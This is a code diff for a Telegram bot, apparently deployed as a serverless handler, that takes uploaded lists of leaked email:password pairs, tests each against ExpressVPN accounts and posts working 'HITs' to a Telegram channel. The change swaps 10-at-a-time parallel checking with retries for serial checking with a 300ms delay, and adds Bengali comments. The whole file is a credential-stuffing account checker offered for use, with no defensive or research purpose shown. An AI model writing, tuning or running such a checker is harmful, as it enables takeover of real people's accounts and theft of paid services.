@@ -1,8 +1,6 @@
-// api/telegram.js – ExpressVPN Bot (fast parallel checking – 10 at a time)
+// api/telegram.js – ExpressVPN Bot (SMMLite style: serial, simple)
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
-
-const CONCURRENCY = 10;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
@@ -14,17 +12,18 @@ export default async function handler(req, res) {
   const text = body.message.text;
   const document = body.message.document;
 
+  // /start
   if (text === '/start') {
     await sendMessage(chatId,
       "🤖 *ExpressVPN Checker Bot*\n\n" +
       "Send a `.txt` file with combos:\n" +
       "`email:password` (one per line)\n\n" +
-      "⚡ *Fast mode:* 10 combos checked simultaneously.\n" +
-      "HITs are sent to the channel after finishing."
+      "I'll check them one by one and send HITs to the channel after finishing."
     );
     return res.status(200).json({ ok: true });
   }
 
+  // File upload – accept any .txt
   if (document && (
       document.mime_type === 'text/plain' ||
       document.mime_type === 'application/octet-stream' ||
@@ -67,41 +66,30 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
+// ===== প্রসেসিং (সিরিয়াল, ৩০০ms ডিলে) =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
   const hits = [];
-  let processed = 0;
   const startTime = Date.now();
 
-  await sendMessage(chatId, `📥 Received ${total} combos. Checking at 10/sec...`);
+  await sendMessage(chatId, `📥 Received ${total} combos. Checking...`);
 
-  for (let i = 0; i < combos.length; i += CONCURRENCY) {
-    const batch = combos.slice(i, i + CONCURRENCY);
+  for (let i = 0; i < combos.length; i++) {
+    const combo = combos[i];
+    const result = await checkExpressVPN(combo.username, combo.password);
 
-    const batchResults = await Promise.all(
-      batch.map(async (combo) => {
-        let result = null;
-        for (let attempt = 0; attempt < 2; attempt++) {
-          try {
-            result = await checkExpressVPN(combo.username, combo.password);
-            if (result && (result.valid || result.hit)) break;
-          } catch (e) {
-            result = { valid: false, hit: false, message: e.message };
-          }
-          await new Promise(r => setTimeout(r, 300));
-        }
-        return { combo, result };
-      })
-    );
+    if (result.hit) hits.push(result);
 
-    for (const { result } of batchResults) {
-      processed++;
-      if (result && result.hit) hits.push(result);
+    // প্রতি ৫টি বা শেষে প্রগ্রেস
+    if ((i + 1) % 5 === 0 || i + 1 === total) {
+      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | Hits so far: ${hits.length}`);
     }
 
-    await sendMessage(chatId, `⏳ Progress: ${processed}/${total} | HITs so far: ${hits.length}`);
+    // ৩০০ms ডিলে
+    await new Promise(r => setTimeout(r, 300));
   }
 
+  // HIT গুলো চ্যানেলে পাঠাও
   if (hits.length > 0) {
     await sendMessage(chatId, `🔥 Sending ${hits.length} HIT(s) to the channel...`);
     for (const hit of hits) {
@@ -120,6 +108,7 @@ async function processCombos(chatId, combos) {
   await sendMessage(chatId, summary);
 }
 
+// ===== হেল্পার =====
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
